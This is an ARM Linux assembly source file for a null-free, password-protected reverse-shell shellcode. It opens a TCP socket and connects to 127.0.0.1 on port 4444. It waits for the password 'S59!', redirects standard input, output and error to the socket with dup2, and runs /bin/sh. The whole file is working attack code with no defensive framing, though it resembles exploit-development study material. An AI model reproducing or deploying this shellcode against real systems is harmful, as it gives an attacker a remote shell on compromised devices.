.section .text
.global _start
_start:

.arm
    add   r3, pc, #1 // switch to thumb mode 
    bx    r3

.thumb

// [281] socket(2, 1, 0) 
    mov   r0, #2
    mov   r1, #1
    eor   r2, r2
    mov   r7, #200
    add   r7, #81
    svc   #1
mov   r10, r0 // save sockfd into r10

// [283] connect(socketfd, target, addrlen) 
    // socket fd is in r0 already
    adr   r1, target
    strb  r2, [r1, #1] // replace the 0xff value of the protocol field with a 0x00
    strb  r2, [r1, #5] // replace the 1st '255' values of the IP field with a 0
    strb  r2, [r1, #6] // replace the 2nd '255' values of the IP field with a 0
    mov   r2, #16
    add   r7, #2  // 281 + 2 = 283
    svc   #1

// [003] read(sourcefd, destbuffer, amount)
    push  {r1}
    mov   r1, sp
    mov   r2, #4
    mov   r7, #3
    read_pass:
        mov   r0, r10
        svc   #1
    check_pass:
        ldr   r3, pass
        ldr   r4, [r1]
        eor   r3, r3, r4
    bne read_pass

// [063] dup2(sockfd, stdIO) 
    mov   r1, #2  // r1 = 2 (stderr)
    mov   r7, #63 // r7 = 63 (dup2)
    loop_stdio:
        mov   r0, r10 // r0 = saved sockfd 
        svc   #1
        sub   r1,#1
    bpl loop_stdio    // loop while r3 >= 0 

// [011] execve(command, 0, 0) 
    adr   r0, command
    eor   r2, r2
    eor   r1, r1
    strb  r2, [r0, #7]
    mov   r7, #11 
    svc   #1

// 2 bytes aligment fix needed (can't use a nop as it has a null byte)
align_bytes : .byte 0xff, 0xff

target:
    // The 0xff will be replaced with a null on runtime
    .ascii "\x02\xff"   // Protocol: IPv4/TCP. 
    
    .ascii "\x11\x5c"   // Port : 4444 
    
    // The '255' will be replaced with a 0 on runtime
    .byte 127,255,255,1 // IP: 127.0.0.1. 
    
command: .ascii "/bin/sh?"  // The '?' will be replaced with a null on runtime

pass: .ascii "S59!"